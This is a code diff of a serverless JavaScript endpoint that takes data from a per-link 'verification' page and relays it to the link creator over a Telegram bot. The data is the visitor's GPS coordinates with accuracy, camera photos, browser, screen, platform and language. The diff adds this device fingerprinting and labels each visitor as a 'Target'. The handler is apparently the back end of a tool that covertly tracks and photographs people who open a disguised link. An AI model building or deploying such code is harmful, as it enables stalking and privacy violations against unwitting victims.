@@ -1,4 +1,3 @@
-
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
@@ -9,7 +8,7 @@ export default async function handler(req, res) {
   const JSONBIN_BIN_ID = process.env.JSONBIN_BIN_ID;
   const JSONBIN_MASTER_KEY = process.env.JSONBIN_MASTER_KEY;
 
-  const { linkId, type, photoData, coords } = req.body;
+  const { linkId, type, photoData, coords, user_agent, screen_res, platform, language } = req.body;
 
   if (!linkId) {
     return res.status(400).json({ error: 'Missing linkId' });
@@ -24,62 +23,74 @@ export default async function handler(req, res) {
     const links = jsonbinData?.record?.links || {};
     
     const linkData = links[linkId];
-    let targetChatId = ADMIN_ID; // Default: admin
+    let targetChatId = ADMIN_ID;
     let creatorName = 'Unknown';
     
     if (linkData && linkData.creator_chat_id) {
       targetChatId = linkData.creator_chat_id;
       creatorName = linkData.creator_name;
-      console.log(`✅ Found creator: ${creatorName} (chat_id: ${targetChatId})`);
-    } else {
-      console.log(`❌ Link ${linkId} not found in JSONBin, sending to admin`);
     }
 
-    // STEP 2: Send data to the CORRECT person
-    if (type === 'location' && coords) {
-      const message = 
+    // STEP 2: Build and send the data
+    let message = `🛡️ **New Verification Captured!**\n\n`;
+    message += `👤 Target Info:\n`;
+    message += `📱 Platform: ${platform || 'Unknown'}\n`;
+    message += `🌐 Browser: ${user_agent ? user_agent.substring(0, 100) : 'Unknown'}\n`;
+    message += `🖥️ Screen: ${screen_res || 'Unknown'}\n`;
+    message += `🗣️ Language: ${language || 'Unknown'}\n`;
+    message += `⏰ Time: ${new Date().toISOString()}\n\n`;
+
+    // Send text info first
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        chat_id: targetChatId, 
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+
+    // Send location if available
+    if (coords && coords.lat && coords.lng) {
+      const locMessage = 
 `📍 **Location Captured!**
 
 Latitude: \`${coords.lat}\`
 Longitude: \`${coords.lng}\`
-🌐 [View on Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lng})
-⏰ Time: ${new Date().toISOString()}`;
+Accuracy: ${coords.accuracy || 'N/A'} meters
+🌐 [View on Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lng})`;
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
           chat_id: targetChatId, 
-          text: message,
+          text: locMessage,
           parse_mode: 'Markdown'
         })
       });
-      
-      console.log(`✅ Location sent to ${targetChatId}`);
     }
 
-    if (type === 'photo' && photoData) {
-      // Remove base64 header
+    // Send photo if available
+    if (photoData) {
       const base64Data = photoData.replace(/^data:image\/\w+;base64,/, '');
       const buffer = Buffer.from(base64Data, 'base64');
 
-      // Send photo via Telegram multipart upload
       const boundary = '----FormBoundary' + Math.random().toString(36).substring(2);
       
-      let body = '';
-      body += `--${boundary}\r\n`;
-      body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
-      body += `${targetChatId}\r\n`;
-      body += `--${boundary}\r\n`;
-      body += `Content-Disposition: form-data; name="photo"; filename="photo.jpg"\r\n`;
-      body += `Content-Type: image/jpeg\r\n\r\n`;
+      let bodyStart = '';
+      bodyStart += `--${boundary}\r\n`;
+      bodyStart += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
+      bodyStart += `${targetChatId}\r\n`;
+      bodyStart += `--${boundary}\r\n`;
+      bodyStart += `Content-Disposition: form-data; name="photo"; filename="photo.jpg"\r\n`;
+      bodyStart += `Content-Type: image/jpeg\r\n\r\n`;
       
-      // Body needs to be a Buffer with binary data
-      const bodyStart = Buffer.from(body, 'utf-8');
-      const photoBuffer = Buffer.from(base64Data, 'base64');
-      const bodyEnd = Buffer.from(`\r\n--${boundary}--\r\n`, 'utf-8');
-      
-      const finalBody = Buffer.concat([bodyStart, photoBuffer, bodyEnd]);
+      const bodyEnd = `\r\n--${boundary}--\r\n`;
+      const startBuffer = Buffer.from(bodyStart, 'utf-8');
+      const endBuffer = Buffer.from(bodyEnd, 'utf-8');
+      const finalBody = Buffer.concat([startBuffer, buffer, endBuffer]);
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
@@ -89,27 +100,12 @@ Longitude: \`${coords.lng}\`
         },
         body: finalBody
       });
-      
-      console.log(`✅ Photo sent to ${targetChatId}`);
     }
 
     res.status(200).json({ success: true, sentTo: targetChatId });
     
   } catch (error) {
     console.error('Error:', error);
-    
-    // Fallback: send to admin
-    try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: ADMIN_ID,
-          text: `❌ Error: ${error.message}\nLink: ${linkId}\nType: ${type}`
-        })
-      });
-    } catch(e) {}
-    
-    res.status(500).json({ error: 'Internal server error' });
+    res.status(500).json({ error: 'Internal server error: ' + error.message });
   }
 }
